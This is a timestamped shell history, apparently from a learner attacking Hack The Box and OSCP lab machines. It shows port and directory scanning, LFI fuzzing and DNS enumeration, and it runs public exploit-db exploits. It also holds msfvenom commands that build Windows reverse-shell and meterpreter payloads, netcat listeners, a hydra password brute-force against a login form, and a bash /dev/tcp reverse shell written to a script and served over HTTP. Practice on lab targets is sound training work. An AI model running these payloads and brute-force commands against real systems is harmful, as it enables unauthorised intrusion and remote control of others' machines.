 8258  2020-11-28 02:02  wfuzz -c -w ./winlfi2.txt -u http://10.10.10.63:50000\?p\=source\&file\=FUZZ  --hw 235,234,236,237,238
 8259  2020-11-28 02:03  wfuzz -c -w ./winlfi2.txt -u http://10.10.10.63:50000/FUZZ  --hw 235,234,236,237,238
 8260  2020-11-28 02:03  wfuzz -c -w ./winlfi2.txt -u http://10.10.10.63:50000../../../../../FUZZ  --hw 235,234,236,237,238
 8261  2020-11-28 02:04  l
 8262  2020-11-28 02:05  cat _full_tcp_nmap.txt
 8263  2020-11-28 02:07  cur lhttp://10.10.10.63:50000/
 8264  2020-11-28 02:07  curl http://10.10.10.63:50000/
 8265  2020-11-28 02:08  dig Jetty 9.4
 8266  2020-11-28 02:10  cherrytree ~/OSCP/results/10.11.1.229/report/CTF_template.ctb
 8267  2020-11-28 02:12  l
 8268  2020-11-28 02:12  cat tcp_80_http_robots.txt
 8269  2020-11-28 02:12  l
 8270  2020-11-28 02:12  cat tcp_80_http_robots.txt
 8271  2020-11-28 02:12  kl
 8272  2020-11-28 02:12  l
 8273  2020-11-28 02:13  cat tcp_50000_http_robots.txt
 8274  2020-11-28 02:13  l
 8275  2020-11-28 02:14  msfconsole -q 
 8276  2020-11-28 02:15  l
 8277  2020-11-28 02:16  cd ..
 8278  2020-11-28 02:16  l
 8279  2020-11-28 02:16  cd exploit
 8280  2020-11-28 02:16  l
 8281  2020-11-28 02:16  touch exploit.py
 8282  2020-11-28 02:16  vim exploit.py
 8283  2020-11-28 02:16  l
 8284  2020-11-28 02:16  chmod +x exploit.py
 8285  2020-11-28 02:16  l
 8286  2020-11-28 02:16  python3 exploit.py
 8287  2020-11-28 02:16  vim exploit.py
 8288  2020-11-28 02:17  python3 exploit.py
 8289  2020-11-28 02:17  vim exploit.py
 8290  2020-11-28 02:17  python3 exploit.py
 8291  2020-11-28 02:17  vim exploit.py
 8292  2020-11-28 02:17  python3 exploit.py
 8293  2020-11-28 02:18  vim exploit.py
 8294  2020-11-28 02:18  python3 exploit.py
 8295  2020-11-28 02:18  vim exploit.py
 8296  2020-11-28 02:18  python3 exploit.py
 8297  2020-11-28 02:18  python exploit.py
 8298  2020-11-28 02:18  python3 exploit.py
 8299  2020-11-28 02:18  vim exploit.py
 8300  2020-11-28 02:20  python3 exploit.py
 8301  2020-11-28 02:20  vim exploit.py
 8302  2020-11-28 02:20  python3 exploit.py
 8303  2020-11-28 02:21  pip3 install --user colorama
 8304  2020-11-28 02:21  vim exploit.py
 8305  2020-11-28 02:22  python3 exploit.py
 8306  2020-11-28 02:23  searchsploit CVE-2015-2080
 8307  2020-11-28 02:23  exit
 8308  2020-11-28 02:23  python3 exploit.py
 8309  2020-11-28 02:24  vim exploit.py
 8310  2020-11-28 02:26  l
 8311  2020-11-28 02:26  touch jettybleed.py
 8312  2020-11-28 02:26  vim jettybleed.py q
 8313  2020-11-28 02:26  chmod +x jettybleed.py
 8314  2020-11-28 02:26  l
 8315  2020-11-28 02:27  python3 jettybleed.py
 8316  2020-11-28 02:27  python3 jettybleed.py http://10.10.10.63:50000/
 8317  2020-11-28 02:27  python3 jettybleed.py http://10.10.10.63:50000
 8318  2020-11-28 02:27  python3 jettybleed.py 10.10.10.63:50000
 8319  2020-11-28 02:27  l
 8320  2020-11-28 02:27  vim jettybleed.py
 8321  2020-11-28 02:27  vim exploit.py
 8322  2020-11-28 02:28  vim jettybleed.py
 8323  2020-11-28 02:29  python3 jettybleed.py http://10.10.10.63:50000
 8324  2020-11-28 02:33  l
 8325  2020-11-28 02:33  cd ..
 8326  2020-11-28 02:33  l
 8327  2020-11-28 02:33  cd scans
 8328  2020-11-28 02:33  l
 8329  2020-11-28 02:33  cat _manual_commands.txt
 8330  2020-11-28 02:36  l
 8331  2020-11-28 02:36  ll
 8332  2020-11-28 02:36  cd OSCP
 8333  2020-11-28 02:36  kl
 8334  2020-11-28 02:36  cd
 8335  2020-11-28 02:36  cd HTB
 8336  2020-11-28 02:36  l
 8337  2020-11-28 02:36  cd results
 8338  2020-11-28 02:36  l
 8339  2020-11-28 02:36  cd 10.10.10.74
 8340  2020-11-28 02:36  lk
 8341  2020-11-28 02:36  l
 8342  2020-11-28 02:36  cd scans
 8343  2020-11-28 02:36  l
 8344  2020-11-28 02:36  cat _full_tcp_nmap.txt
 8345  2020-11-28 02:37  cat V
 8346  2020-11-28 02:37  cat tcp_9255_http_whatweb.txt
 8347  2020-11-28 02:37  cast tcp_9255_http_robots.txt
 8348  2020-11-28 02:37  cat tcp_9255_http_robots.txt
 8349  2020-11-28 02:37  cat tcp_9255_http_nikto.txt
 8350  2020-11-28 02:37  l
 8351  2020-11-28 02:37  cat tcp_9255_http_gobuster.txt
 8352  2020-11-28 02:38  l
 8353  2020-11-28 02:39  curl 10.10.10.74:9255
 8354  2020-11-28 02:39  curl http://10.10.10.74:9255
 8355  2020-11-28 02:39  l
 8356  2020-11-28 02:39  nmap -sS 10.10.10.74
 8357  2020-11-28 02:39  sudo nmap -sS 10.10.10.74
 8358  2020-11-28 02:41  l
 8359  2020-11-28 02:41  cat tcp_50000_http_gobuster_big.txt
 8360  2020-11-28 02:43  gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 10.10.10.63:50000 -o dirbusterwordlist50000
 8361  2020-11-28 02:44  gobuster dir -u 10.10.10.63:50000/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e -k -l -s "200,204,301,302,307,403,500" -x "txt,html,php,asp,aspx,jsp"  -o gobuster50000.txt
 8362  2020-11-28 02:44  gobuster dir -u http://10.10.10.63:50000/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e -k -l -s "200,204,301,302,307,403,500" -x "txt,html,php,asp,aspx,jsp"  -o gobuster50000.txt
 8363  2020-11-28 02:45  l
 8364  2020-11-28 02:45  gobuster dir -u http://10.10.10.74:9255/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e -k -l -s "200,204,301,302,307,403,500" -x "txt,html,php,asp,aspx,jsp"  -o gobuster9255.txt
 8365  2020-11-28 02:47  gobuster dir -u http://10.10.10.74:9255 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e -k -l -s "200,204,301,302,307,403,500" -x "txt,html,php,asp,aspx,jsp"  -o gobuster9255.txt
 8366  2020-11-28 02:47  gobuster dir -u http://10.10.10.74:9255/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e -k -l -s "200,204,301,302,307,403,500" -x "txt,html,php,asp,aspx,jsp"  -o gobuster9255.txt
 8367  2020-11-28 02:48  l
 8368  2020-11-28 02:48  ping 10.10.10.74:9255
 8369  2020-11-28 02:49  ping 10.10.10.74
 8370  2020-11-28 03:16  l
 8371  2020-11-28 03:16  gobuster dir -u http://10.10.10.74:9255/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e -k -l -s "200,204,301,302,307,403,500" -x "txt,html,php,asp,aspx,jsp"  -o gobuster9255.txt
 8372  2020-11-28 03:17  dig http://10.10.10.74:9255
 8373  2020-11-28 03:18  l
 8374  2020-11-28 03:19  nmap -p- -T4 -oA allport 10.10.10.74
 8375  2020-11-28 03:19  nmap -Pn -p- -T4 -oA allport 10.10.10.74
 8376  2020-11-28 03:22  l
 8377  2020-11-28 03:22  cd ..
 8378  2020-11-28 03:22  l
 8379  2020-11-28 03:22  cd exploit
 8380  2020-11-28 03:22  l
 8381  2020-11-28 03:22  cd ..
 8382  2020-11-28 03:22  l
 8383  2020-11-28 03:22  cd windows_priv_esc_scripts
 8384  2020-11-28 03:22  l
 8385  2020-11-28 03:22  cd windows_tools
 8386  2020-11-28 03:22  l
 8387  2020-11-28 03:22  sudo python -m SimpleHTTPServer 80
 8388  2020-11-28 03:23  sudo lsof -iTCP:80 -sTCP:LISTEN\n
 8389  2020-11-28 03:23  sudo kill -0 624
 8390  2020-11-28 03:23  sudo python -m SimpleHTTPServer 80
 8391  2020-11-28 03:23  sudo kill -9 624
 8392  2020-11-28 03:23  sudo python -m SimpleHTTPServer 80
 8393  2020-11-28 03:23  l
 8394  2020-11-28 03:23  sudo python -m SimpleHTTPServer 80
 8395  2020-11-28 03:27  sudo impacket-smbserver SPITFIRE  ./
 8396  2020-11-28 03:29  sudo rlwrap nc -lnvp 443
 8397  2020-11-28 03:33  fg
 8398  2020-11-28 03:33  bg
 8399  2020-11-28 03:33  l
 8400  2020-11-28 03:34  cd ..
 8401  2020-11-28 03:34  l
 8402  2020-11-28 03:38  ls
 8403  2020-11-28 03:38  cd ..
 8404  2020-11-28 03:38  l
 8405  2020-11-28 03:38  cd ..
 8406  2020-11-28 03:38  l
 8407  2020-11-28 03:38  cd windows_priv_esc_scripts
 8408  2020-11-28 03:38  l
 8409  2020-11-28 03:39  sudo impacket-smbserver SPITFIRE  ./
 8410  2020-11-28 03:40  l
 8411  2020-11-28 03:41  sudo impacket-smbserver SPITFIRE  ./
 8412  2020-11-28 03:49  sudo rlwrap nc -lnvp 4455
 8413  2020-11-28 03:50  l
 8414  2020-11-28 03:50  cd windows_tools
 8415  2020-11-28 03:50  sudo impacket-smbserver SPITFIRE  ./
 8416  2020-11-28 03:51  sudo rlwrap nc -lnvp 4455
 8417  2020-11-28 04:25  exit
 8418  2020-11-28 04:25  fg
 8419  2020-11-28 04:25  l
 8420  2020-11-28 04:25  cd ..
 8421  2020-11-28 04:25  l
 8422  2020-11-28 04:25  cd results
 8423  2020-11-28 04:25  l
 8424  2020-11-28 04:25  cd 10.10.10.74
 8425  2020-11-28 04:25  l.
 8426  2020-11-28 04:25  l
 8427  2020-11-28 04:25  cd scans
 8428  2020-11-28 04:26  l
 8429  2020-11-28 04:26  fg
 8430  2020-11-28 04:26  cat allport.nmap
 8431  2020-11-28 04:29  cd ..
 8432  2020-11-28 04:29  l
 8433  2020-11-28 04:29  cd exploit
 8434  2020-11-28 04:29  l
 8435  2020-11-28 04:29  locate 36025
 8436  2020-11-28 04:29  cp /usr/share/exploitdb/exploits/windows/remote/36025.py ./
 8437  2020-11-28 04:29  l
 8438  2020-11-28 04:29  vi m3
 8439  2020-11-28 04:29  vim 36025.py
 8440  2020-11-28 04:30  l
 8441  2020-11-28 04:30  msfconsole -q 
 8442  2020-11-28 04:32  ip a
 8443  2020-11-28 04:45  ping 10.10.10.74
 8444  2020-11-28 04:59  l
 8445  2020-11-28 04:59  vim 36025.py
 8446  2020-11-28 05:01  cat 36025.py
 8447  2020-11-28 05:01  exit
 8448  2020-11-28 05:02  msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp LHOST=10.10.14.39 LPORT=443 -e x86/unicode_mixed -b '\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff' BufferRegister=EAX -f python
 8449  2020-11-28 05:03  msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp LHOST=10.10.14.39 LPORT=443 -e x86/unicode_mixed -b '\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff' BufferRegister=EAX -f python >> lol
 8450  2020-11-28 05:03  l
 8451  2020-11-28 05:03  rm lol
 8452  2020-11-28 05:03  msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp LHOST=10.10.14.39 LPORT=443 -e x86/unicode_mixed -b '\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff' BufferRegister=EAX -f python >> shellcodfe
 8453  2020-11-28 05:04  l
 8454  2020-11-28 05:04  vim shellcodfe
 8455  2020-11-28 05:04  exit
 8456  2020-11-28 05:04  cd HTB/results/10.10.10.74
 8457  2020-11-28 05:04  cd exploit
 8458  2020-11-28 05:04  l
 8459  2020-11-28 05:04  cat shellcodfe
 8460  2020-11-28 05:04  l
 8461  2020-11-28 05:04  vim 36025.py
 8462  2020-11-28 05:05  tmux new -s HTB
 8463  2020-11-28 05:05  l
 8464  2020-11-28 05:05  sudo rlwrap nc -lnvp 443
 8465  2020-11-28 05:05  python 36025.py
 8466  2020-11-28 05:05  l
 8467  2020-11-28 05:06  vim 36025.py
 8468  2020-11-28 05:06  python 36025.py
 8469  2020-11-28 05:06  vim 36025.py
 8470  2020-11-28 05:07  python 36025.py
 8471  2020-11-28 05:09  msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp LHOST=10.10.14.39 LPORT=443 -e x86/unicode_mixed -b '\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff' BufferRegister=EAX -f python >> shellcodfe
 8472  2020-11-28 05:10  exit
 8473  2020-11-28 05:10  msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp LHOST=10.10.14.39 LPORT=443 -e x86/unicode_mixed -b '\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff' BufferRegister=EAX -f python
 8474  2020-11-28 05:10  vim 36025.py
 8475  2020-11-28 05:10  cp /usr/share/exploitdb/exploits/windows/remote/36025.py ./
 8476  2020-11-28 05:10  vim 36025.py
 8477  2020-11-28 05:11  sudo rlwrap nc -lnvp 443
 8478  2020-11-28 05:11  python 36025.py
 8479  2020-11-28 05:11  vim 36025.py
 8480  2020-11-28 05:13  ping 10.10.10.74
 8481  2020-11-28 05:13  python 36025.py
 8482  2020-11-28 05:15  sudo rlwrap nc -lnvp 443
 8483  2020-11-28 05:15  python 36025.py
 8484  2020-11-28 05:21  l
 8485  2020-11-28 05:21  cd
 8486  2020-11-28 05:21  cd htb
 8487  2020-11-28 05:21  l
 8488  2020-11-28 05:21  cd HTB
 8489  2020-11-28 05:21  l
 8490  2020-11-28 05:21  cd windows_priv_esc_scripts
 8491  2020-11-28 05:21  l
 8492  2020-11-28 05:21  sudo impacket-smbserver SPITFIRE  ./\n
 8493  2020-11-28 05:22  l
 8494  2020-11-28 05:23  cd ~/Downloads/windows-privesc-check/
 8495  2020-11-28 05:23  l
 8496  2020-11-28 05:23  cd ..
 8497  2020-11-28 05:23  l
 8498  2020-11-28 05:23  ls
 8499  2020-11-28 05:23  cd privilege-escalation-awesome-scripts-suite/l
 8500  2020-11-28 05:23  cd privilege-escalation-awesome-scripts-suite/
 8501  2020-11-28 05:23  l
 8502  2020-11-28 05:23  cd winPEAS
 8503  2020-11-28 05:23  l
 8504  2020-11-28 05:23  cd winPEAS
 8505  2020-11-28 05:23  l
 8506  2020-11-28 05:23  cd winPEAS
 8507  2020-11-28 05:23  l
 8508  2020-11-28 05:23  cd winPEASexe
 8509  2020-11-28 05:23  l
 8510  2020-11-28 05:23  cd winPEAS
 8511  2020-11-28 05:23  l
 8512  2020-11-28 05:24  cd bin
 8513  2020-11-28 05:24  l
 8514  2020-11-28 05:24  cd x86
 8515  2020-11-28 05:24  kl
 8516  2020-11-28 05:24  l
 8517  2020-11-28 05:24  cd Release
 8518  2020-11-28 05:24  l
 8519  2020-11-28 05:24  sudo impacket-smbserver SPITFIRE  ./\n
 8520  2020-11-28 05:24  cp winPEAS.exe ~/HTB/windows_priv_esc_scripts/
 8521  2020-11-28 05:25  cd ~/HTB/windows_priv_esc_scripts/
 8522  2020-11-28 05:25  l
 8523  2020-11-28 05:25  vim .
 8524  2020-11-28 05:31  msfvenom  -p  windows/meterpreter/reverse_tcp  lhost=10.10.14.39 lport=4444  -f bat -o reset.bat
 8525  2020-11-28 05:50  exit
 8526  2020-11-28 05:50  msfvenom  -p  windows/meterpreter/reverse_tcp  lhost=10.10.14.39 lport=4444  -f bat -o reset.bat
 8527  2020-11-28 05:50  l
 8528  2020-11-28 05:50  tmux new -s HTB
 8529  2020-11-28 05:50  l
 8530  2020-11-28 05:50  cd ..
 8531  2020-11-28 05:50  l
 8532  2020-11-28 05:51  git clone https://github.com/JohnHammond/oscp-notetaking.git
 8533  2020-11-28 05:51  l
 8534  2020-11-28 05:51  cd oscp-notetaking
 8535  2020-11-28 05:51  l
 8536  2020-11-28 05:51  ./generate_report.sh
 8537  2020-11-28 05:51  ./generate_report.sh lol lol
 8538  2020-11-28 05:51  l
 8539  2020-11-28 05:51  vim generate_report.sh
 8540  2020-11-28 05:52  pandoc
 8541  2020-11-28 05:52  sudo apt install pandoc 
 8542  2020-11-28 06:01  ping 10.10.10.13
 8543  2020-11-28 06:01  l
 8544  2020-11-28 06:02  cd ..
 8545  2020-11-28 06:02  l
 8546  2020-11-28 06:02  cd results
 8547  2020-11-28 06:02  l
 8548  2020-11-28 06:02  cd 10.10.10.13
 8549  2020-11-28 06:02  l
 8550  2020-11-28 06:02  cd scans
 8551  2020-11-28 06:02  l
 8552  2020-11-28 06:02  cd ..
 8553  2020-11-28 06:02  l
 8554  2020-11-28 06:02  #sudo autorecon 10.10.10.13
 8555  2020-11-28 06:02  cd ..
 8556  2020-11-28 06:02  sudo autorecon 10.10.10.13
 8557  2020-11-28 06:07  l
 8558  2020-11-28 06:07  cd results
 8559  2020-11-28 06:07  l
 8560  2020-11-28 06:07  cd 10.10.10.13
 8561  2020-11-28 06:07  l
 8562  2020-11-28 06:07  cd scans
 8563  2020-11-28 06:07  l
 8564  2020-11-28 06:07  cat tcp_80_http_gobuster.txt
 8565  2020-11-28 06:07  cat tcp_80_http_nikto.txt
 8566  2020-11-28 06:07  l
 8567  2020-11-28 06:08  cat tcp_80_http_whatweb.txt
 8568  2020-11-28 06:08  l
 8569  2020-11-28 06:08  cat _manual_commands.txt
 8570  2020-11-28 06:09  gobuster dir -u http://10.10.10.13:80/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e -k -l -s "200,204,301,302,307,403,500" -x "txt,html,php,asp,aspx,jsp"  -o "/home/kali/HTB/results/10.10.10.13/scans/tcp_80_http_gobuster_dirbuster.txt"
 8571  2020-11-28 06:23  cd ~/HTB/results/10.10.10.13/scans
 8572  2020-11-28 06:23  l
 8573  2020-11-28 06:23  cat tcp_53_dns_nmap.txt
 8574  2020-11-28 06:24  dig  10.10.10.13
 8575  2020-11-28 06:26  nmap --script dns-nsid 10.10.10.13
 8576  2020-11-28 06:27  nslookup 10.10.10.13
 8577  2020-11-28 06:27  nslookup
 8578  2020-11-28 06:42  l
 8579  2020-11-28 06:43  nmap -p- -T4 -oA allport 10.10.10.13
 8580  2020-11-28 06:50  msfconsole -q 
 8581  2020-11-28 06:52  l
 8582  2020-11-28 06:53  searchsploit bind.version: 9.10.3-P4-Ubuntu
 8583  2020-11-28 06:53  searchsploit bindversion 
 8584  2020-11-28 06:53  searchsploit bind version 
 8585  2020-11-28 06:54  l
 8586  2020-11-28 06:55  nmap -sCV -oA topports 10.10.10.13
 8587  2020-11-28 06:55  searchsploit ISC BIND 
 8588  2020-11-28 06:57  searchsploit -
 8589  2020-11-28 06:57  searchsploit -h
 8590  2020-11-28 06:58  searchsploit -m linux/remote/19111.c
 8591  2020-11-28 06:58  l
 8592  2020-11-28 06:58  vim 19111.c
 8593  2020-11-28 06:59  chmod +x 19111.c
 8594  2020-11-28 06:59  l
 8595  2020-11-28 06:59  gcc 19111.c
 8596  2020-11-28 06:59  l
 8597  2020-11-28 06:59  ./a.out
 8598  2020-11-28 07:00  ./a.out 10.10.10.13
 8599  2020-11-28 07:01  nmap -sCV -oA topports 10.10.10.13
 8600  2020-11-28 07:01  searchsploit ISC BIND 
 8601  2020-11-28 07:02  searchsploit -x multiple/dos/37721.c
 8602  2020-11-28 07:02  l
 8603  2020-11-28 07:03  sudo nmap -sSV -oA udp 10.10.10.13
 8604  2020-11-28 07:03  b
 8605  2020-11-28 07:03  vim /etc/hosts
 8606  2020-11-28 07:03  sudo vim /etc/hosts
 8607  2020-11-28 07:05  gobuster dir -u http://cronos.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e -k -l -s "200,204,301,302,307,403,500" -x "txt,html,php,asp,aspx,jsp"  -o http://cronos.htb.txt
 8608  2020-11-28 07:05  gobuster dir -u https://cronos.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e -k -l -s "200,204,301,302,307,403,500" -x "txt,html,php,asp,aspx,jsp"  -o http://cronos.htb.txt
 8609  2020-11-28 07:06  gobuster dir -u https://cronos.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e -k -l -s "200,204,301,302,307,403,500" -x "txt,html,php,asp,aspx,jsp"  -ohttp://cronos.htb.txt
 8610  2020-11-28 07:06  gobuster dir -u https://cronos.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e -k -l -s "200,204,301,302,307,403,500" -x "txt,html,php,asp,aspx,jsp"  -p  cronos.htb.txt
 8611  2020-11-28 07:06  gobuster dir -u http://cronos.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e -k -l -s "200,204,301,302,307,403,500" -x "txt,html,php,asp,aspx,jsp"  -o cronos.htb.txt
 8612  2020-11-28 07:15  dig version.bind CHAOS TXT cronos.htb
 8613  2020-11-28 07:15  dig axfr cronos.htb
 8614  2020-11-28 07:18  curl http://cronos.htb/index.php
 8615  2020-11-28 07:18  l
 8616  2020-11-28 07:18  curl http://cronos.htb/index.php
 8617  2020-11-28 07:36  dig http://cronos.htb/
 8618  2020-11-28 07:41  dnsmap
 8619  2020-11-28 07:42  sudo apt install dnsmap
 8620  2020-11-28 07:42  dnsmap
 8621  2020-11-28 07:43  cd /usr/share/wordlists/metasploit
 8622  2020-11-28 07:43  l
 8623  2020-11-28 07:43  ls
 8624  2020-11-28 07:45  dig ANY 10.10.10.13 http://cronos.htb/
 8625  2020-11-28 07:45  dig -x 10.10.10.13 @http://cronos.htb/  
 8626  2020-11-28 07:45  dig -x 10.10.10.13 @cronos.htb
 8627  2020-11-28 07:46  dig -x 10.10.10.13 @ns1.cronos.htb
 8628  2020-11-28 07:47  dig -x 10.10.10.13 @http://cronos.htb/  
 8629  2020-11-28 07:47  dig -x 10.10.10.13 @cronos.htb
 8630  2020-11-28 07:47  di
 8631  2020-11-28 07:47  dig
 8632  2020-11-28 07:47  dig -h
 8633  2020-11-28 07:48  whois
 8634  2020-11-28 07:48  whois cronos.htb
 8635  2020-11-28 07:48  msfconsole -q 
 8636  2020-11-28 07:49  l
 8637  2020-11-28 07:49  cd
 8638  2020-11-28 07:49  l
 8639  2020-11-28 07:49  cd HTB/results
 8640  2020-11-28 07:49  l
 8641  2020-11-28 07:50  cd 10.10.10.13
 8642  2020-11-28 07:50  ;
 8643  2020-11-28 07:50  l
 8644  2020-11-28 07:50  cd scans
 8645  2020-11-28 07:50  l
 8646  2020-11-28 07:50  dnsrecon -d cronos.htb -a -n 10.10.10.13
 8647  2020-11-28 07:52  sudo vim /etc/hosts
 8648  2020-11-28 07:55  gobuster dir -u http://admin.cronos.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e -k -l -s "200,204,301,302,307,403,500" -x "txt,html,php,asp,aspx,jsp"  -o admin.cronos.htb.txt
 8649  2020-11-28 08:02  host -t mx admin.cronos.htb
 8650  2020-11-28 08:02  host -t mx cronos.htb
 8651  2020-11-28 08:03  host -t  cronos.htb
 8652  2020-11-28 08:03  host   cronos.htb
 8653  2020-11-28 08:03  dnsrecon -d 10.10.10.13 -t axfr
 8654  2020-11-28 08:08  hydra -L "/usr/share/seclists/Usernames/top-usernames-shortlist.txt" -P "/usr/share/seclists/Passwords/darkweb2017-top100.txt" -e nsr -s 8080 http-post-form://10.11.1.73:8080/PHP/index.php\?tg\=login\&cmd\=authform\&msg\=Login\&err\=\n
 8655  2020-11-28 08:08  curl http://admin.cronos.htb/
 8656  2020-11-28 08:09  l
 8657  2020-11-28 08:15  sudo tcpdump  -i tun0
 8658  2020-11-28 08:15  sudo rlwrap nc -lnvp 443
 8659  2020-11-28 08:17  sudo python -m SimpleHTTPServer 80
 8660  2020-11-28 08:17  l
 8661  2020-11-28 08:17  ip a
 8662  2020-11-28 08:17  sudo python -m SimpleHTTPServer 80
 8663  2020-11-28 08:18  sudo tcpdump  -i tun0
 8664  2020-11-28 08:18  sudo python -m SimpleHTTPServer 80
 8665  2020-11-28 08:19  l
 8666  2020-11-28 08:19  cd ..
 8667  2020-11-28 08:19  l
 8668  2020-11-28 08:19  cd exploit
 8669  2020-11-28 08:19  l
 8670  2020-11-28 08:19  echo bash -i >& /dev/tcp/10.10.14.39/443 0>&1 >> lol.sh
 8671  2020-11-28 08:19  l
 8672  2020-11-28 08:19  echo 'bash -i >& /dev/tcp/10.10.14.39/443 0>&1' >> lol.sh
 8673  2020-11-28 08:19  l
 8674  2020-11-28 08:19  cat lol.sh
 8675  2020-11-28 08:20  sudo python -m SimpleHTTPServer 80
 8676  2020-11-28 08:22  sudo rlwrap nc -lnvp 443
 8677  2020-11-28 11:40  sudo python -m SimpleHTTPServer 80
 8678  2020-11-28 11:40  l
 8679  2020-11-28 11:40  cd ..
 8680  2020-11-28 11:40  l
 8681  2020-11-28 11:40  cd exploit
 8682  2020-11-28 11:40  l
 8683  2020-11-28 11:40  cat lol.sh
 8684  2020-11-28 11:41  sudo python -m SimpleHTTPServer 80
 8685  2020-11-28 11:51  l
 8686  2020-11-28 11:52  cherrytree ~/OSCP/admin_dept/results/10.3.3.34/report/tricia.ctb
 8687  2020-11-28 11:53  cherrytree ~/OSCP/admin_dept/results/10.3.3.190/report/HARRY.ctb
 8688  2020-11-28 11:53  cherrytree ~/OSCP/admin_dept/results/10.3.3.201
 8689  2020-11-28 11:53  cd ..
 8690  2020-11-28 11:53  k
